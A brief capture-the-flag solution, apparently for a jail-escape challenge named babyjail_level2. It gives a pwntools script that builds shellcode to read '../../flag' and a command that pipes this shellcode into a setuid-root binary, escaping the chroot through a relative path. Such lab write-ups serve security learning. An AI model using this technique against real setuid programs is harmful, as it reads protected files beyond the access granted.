pwn scripts:

```
from pwn import *
context(log_level = 'info', arch = 'amd64', os = 'linux')
shellcode=shellcode=asm(shellcraft.cat('../../flag'))
sys.stdout.buffer.write(shellcode)
```

save the script above to /tmp/res.py and then execute:   
`python3 /tmp/res.py | ./babyjail_level2 a`    
babyjail_level2 is a file under /challenge with root bit.

